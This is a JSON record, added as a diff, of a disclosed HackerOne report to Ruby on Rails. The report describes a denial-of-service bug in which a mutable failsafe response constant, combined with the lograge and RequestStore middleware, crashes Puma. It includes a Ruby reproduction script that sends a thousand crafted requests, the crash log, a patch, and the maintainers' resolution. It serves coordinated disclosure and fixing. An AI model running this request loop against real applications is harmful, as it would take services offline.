@@ -1,0 +1,407 @@
+{
+  "id": 1300802,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzAwODAy",
+  "url": "https://hackerone.com/reports/1300802",
+  "title": "Possible DOS in app with crashing `exceptions_app`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-08-11T19:49:56.292Z",
+  "submitted_at": "2021-08-11T19:49:56.339Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ghiculescu",
+    "url": "/ghiculescu",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-06-28T00:42:04.824Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-28T00:41:54.734Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Make a new Rails app, add the `lograge` gem.\n\n```ruby\n# config/application.rb\nconfig.exceptions_app = self.routes\nconfig.lograge.enabled = true\n```\n\n```ruby\n# config/routes.rb\n\nRails.application.routes.draw do\n  root to: \"site#index\"\n\n  get 'errors/not_found'\n  match \"/404\", to: \"errors#not_found\", via: :all\nend\n```\n\n```ruby\n# app/controllers/errors_controller.rb\n\nclass ErrorsController < ApplicationController\n  def not_found\n    render status: 404 # the view can do whatever, it doesn't matter\n  end\nend\n```\n\nStart the server as a production app (eg. it would start on Heroku): `RAILS_ENV=production RACK_ENV=production SECRET_KEY_BASE=foo RAILS_SERVE_STATIC_FILES=enabled RAILS_MAX_THREADS=2 RAILS_LOG_TO_STDOUT=enabled rails s`\n\nRun this script:\n\n```ruby\n1000.times.each do |n|\n  `curl -H \"Accept: application/xml\" -H \"Content-Type: application/xml\" -X GET http://localhost:3000///wp1/wp-includes/wlwmanifest.xml`\nend\n```\n\nAt some point (after 989 requests for me), Puma will crash:\n\n```\n2021-08-11 13:23:04 -0500 Rack app (\"GET ///wp1/wp-includes/wlwmanifest.xml\" - (127.0.0.1)): #<fatal: machine stack overflow in critical region>\n```\n\nSince it's a fatal Ruby error (which is unrecoverable) this leaves Puma in a zombie state, similar to https://github.com/puma/puma/issues/2552\n\nThe reason this crashes is:\n\n- [ActionDispatch::ShowExceptions](https://github.com/rails/rails/blob/main/actionpack/lib/action_dispatch/middleware/show_exceptions.rb#L55) returns a non-frozen const.\n- [lograge](https://github.com/roidrage/lograge/blob/master/lib/lograge/rails_ext/rack/logger.rb#L15) doesn't wrap this response in a `Rack::BodyProxy`. If you weren't using lograge, then Rails would do so [here](https://github.com/rails/rails/blob/main/railties/lib/rails/rack/logger.rb#L37). Before realising this could be a Rails security vulnerability, I made a PR for this here: https://github.com/roidrage/lograge/pull/333\n- [RequestStore](https://github.com/steveklabnik/request_store/blob/master/lib/request_store/middleware.rb#L21) mutates the response body. This causes the const in Rails to get mutated, it now is a `Rack::BodyProxy` with a reference to itself. Every time it gets returned, it gets mutated again and the object gets one layer bigger.  Before realising this could be a Rails security vulnerability, I made a PR for the mutation here: https://github.com/steveklabnik/request_store/pull/78\n- Eventually, we have an extremely large `Rack::BodyProxy` that references itself hundreds of times in memory. This is easy to make crash. In our case, [Rack::Sendfile](https://github.com/rack/rack/blob/master/lib/rack/sendfile.rb#L113) causes a `SystemStackError`, I think this happens because of how `BodyProxy` handles `respond_to_missing?`.\n\nI don't think this issue is unique to `lograge` + `RequestStore`. It can happen anywhere you have:\n\n- A middleware that mutates a response, and\n- `FAILSAFE_RESPONSE` (or another non-frozen const) being passed to that middleware, and\n- Something higher in the middleware stack that calls a missing method on the response.\n\nI was about to make a PR to Rails with this patch when it dawned on me that this could be a security issue:\n\n```diff\ndiff --git a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\nindex 0a7e895e59..d207765acc 100644\n--- a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\n+++ b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb\n@@ -14,13 +14,14 @@ module ActionDispatch\n   # If the application returns a \"X-Cascade\" pass response, this middleware\n   # will send an empty response as result with the correct status code.\n   # If any exception happens inside the exceptions app, this middleware\n-  # catches the exceptions and returns a FAILSAFE_RESPONSE.\n+  # catches the exceptions and returns a failsafe response.\n   class ShowExceptions\n     FAILSAFE_RESPONSE = [500, { \"Content-Type\" => \"text/plain\" },\n       [\"500 Internal Server Error\\n\" \\\n        \"If you are the administrator of this website, then please read this web \" \\\n        \"application's log file and/or the web server's log file to find out what \" \\\n        \"went wrong.\"]]\n+    deprecate_constant :FAILSAFE_RESPONSE\n\n     def initialize(app, exceptions_app)\n       @app = app\n@@ -52,7 +53,15 @@ def render_exception(request, exception)\n         response[1][\"X-Cascade\"] == \"pass\" ? pass_response(status) : response\n       rescue Exception => failsafe_error\n         $stderr.puts \"Error during failsafe response: #{failsafe_error}\\n  #{failsafe_error.backtrace * \"\\n  \"}\"\n-        FAILSAFE_RESPONSE\n+        failsafe_response\n+      end\n+\n+      def failsafe_response\n+        [500, { \"Content-Type\" => \"text/plain\" },\n+          [\"500 Internal Server Error\\n\" \\\n+         \"If you are the administrator of this website, then please read this web \" \\\n+         \"application's log file and/or the web server's log file to find out what \" \\\n+         \"went wrong.\"]]\n       end\n\n       def pass_response(status)\n```\n\n## Impact\n\nIf you find an app that's configured as above you could bring it offline by making the same bad request enough times.",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2023-07-28T00:41:54.816Z",
+  "allow_singular_disclosure_after": -4947153.442421263,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "zy9ard3",
+    "doublecreak",
+    "markh714"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 12941599,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "btw I have a private repo you can replicate this in @ https://github.com/ghiculescu/show-exceptions-crash, let me know if you want access to it.",
+      "automated_response": false,
+      "created_at": "2021-08-11T19:53:20.023Z",
+      "updated_at": "2021-08-11T19:53:20.023Z",
+      "actor": {
+        "username": "ghiculescu",
+        "cleared": false,
+        "verified": false,
+        "url": "/ghiculescu",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 12957758,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the report! This is definitely a security issue we should solve.\n\nMy main worry is that the constant being mutated could lead to leaking something from one user's request into another's. Your patch seems like the right fix for that issue as well, I think it's just a matter of identifying the severity and potential impact.",
+      "automated_response": false,
+      "created_at": "2021-08-12T20:11:39.272Z",
+      "updated_at": "2021-08-12T20:11:39.272Z",
+      "actor": {
+        "username": "jhawthorn",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhawthorn",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/507/979/460a776c8eb1573e8669f4bd49776c419d06e15c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13078745,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Anything more I can do to help you here?",
+      "automated_response": false,
+      "created_at": "2021-08-19T22:49:06.845Z",
+      "updated_at": "2021-08-19T22:49:06.845Z",
+      "actor": {
+        "username": "ghiculescu",
+        "cleared": false,
+        "verified": false,
+        "url": "/ghiculescu",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13163769,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@jhawthorn someone else has logged the same bug: https://github.com/rails/rails/issues/43094\n\nSince it’s public, should I make a PR to fix it?",
+      "automated_response": false,
+      "created_at": "2021-08-25T11:24:30.008Z",
+      "updated_at": "2021-08-25T11:24:30.008Z",
+      "actor": {
+        "username": "ghiculescu",
+        "cleared": false,
+        "verified": false,
+        "url": "/ghiculescu",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13167966,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "In my estimation, this is not a Rails vuln and can be addressed as a \"guard rails\" thing in a Rails PR.\n\nYour PRs to the other two libraries are great and *are* vulns IMO.\n\nFor the Rails PR, would rather freeze that constant than cater to middleware that mutate it. Let it blow up, as it should. Fail fast.",
+      "automated_response": false,
+      "created_at": "2021-08-25T16:42:58.889Z",
+      "updated_at": "2021-08-25T16:42:58.889Z",
+      "actor": {
+        "username": "jeremy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jeremy",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13168312,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@jeremy my concern with freezing is that middleware mutating responses is apparently a common pattern.\n\n- It's in Rails: https://github.com/rails/rails/blob/main/actionpack/lib/action_dispatch/middleware/executor.rb#L15\n- And in rack/lock: https://github.com/rack/rack/blob/master/lib/rack/lock.rb#L19\n- And obviously in `request_store` (if you know a way to get that PR merged faster that'd be awesome).\n\nIt's probably in other places too. If we freeze the constant in Rails, it could cause other code to crash, and you'd still get internal errors raised to Puma. (You *wouldn't* be able to make Ruby crash, though, so it's still an improvement.)\n\nI've made a PR - https://github.com/rails/rails/pull/43103 - my original diff so I can run the tests, but happy to change to the freeze approach if you think it's the right way to go regardless.\n",
+      "automated_response": false,
+      "created_at": "2021-08-25T17:17:48.862Z",
+      "updated_at": "2021-08-25T17:17:48.862Z",
+      "actor": {
+        "username": "ghiculescu",
+        "cleared": false,
+        "verified": false,
+        "url": "/ghiculescu",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13168451,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Agreed regarding response mutation. We'd have to deep-dup; no way. Let's build a fresh response each time instead as you suggest in your original patch. (This would be a nice case for some kind of immutable Tuple type in Ruby.)\n\nMakes sense to push for a higher criticality exploit as well, e.g. privacy leak or user authentication confusion, if possible, with our \"What's the worst that could happen?\" hat on. Denial of service isn't great but leakage across responses could be far worse in theory.",
+      "automated_response": false,
+      "created_at": "2021-08-25T17:31:36.328Z",
+      "updated_at": "2021-08-25T17:31:36.328Z",
+      "actor": {
+        "username": "jeremy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jeremy",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13168902,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I'm definitely not a security researcher, so I wouldn't rule anything out, but I don't really have any ideas (or excess free time) to push the exploit further. I just noticed this because one of our apps got taken offline by it!\n\nRails PR is up, if you'd like to take a look.",
+      "automated_response": false,
+      "created_at": "2021-08-25T18:11:47.387Z",
+      "updated_at": "2021-08-25T18:11:47.387Z",
+      "actor": {
+        "username": "ghiculescu",
+        "cleared": false,
+        "verified": false,
+        "url": "/ghiculescu",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 13184164,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thanks @ghiculescu! Merged your PR to main. We'll get it lined up for backporting and inclusion in the next security releases as well.",
+      "automated_response": false,
+      "created_at": "2021-08-26T16:15:20.206Z",
+      "updated_at": "2021-08-26T16:15:20.206Z",
+      "actor": {
+        "username": "jeremy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jeremy",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/121/d8d8bc5a99a5229118f3f1064beb83458d1d10d6_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ghiculescu",
+        "url": "/ghiculescu"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22547984,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-28T00:41:54.769Z",
+      "updated_at": "2023-06-28T00:41:54.769Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "rafaelfranca",
+        "cleared": false,
+        "verified": false,
+        "url": "/rafaelfranca",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22547985,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-28T00:42:04.767Z",
+      "updated_at": "2023-06-28T00:42:04.767Z",
+      "actor": {
+        "username": "rafaelfranca",
+        "cleared": false,
+        "verified": false,
+        "url": "/rafaelfranca",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22547989,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::NotEligibleForBounty",
+      "message": "It was handled as a regular bug fix.",
+      "automated_response": false,
+      "created_at": "2023-06-28T00:42:41.352Z",
+      "updated_at": "2023-06-28T00:42:41.352Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
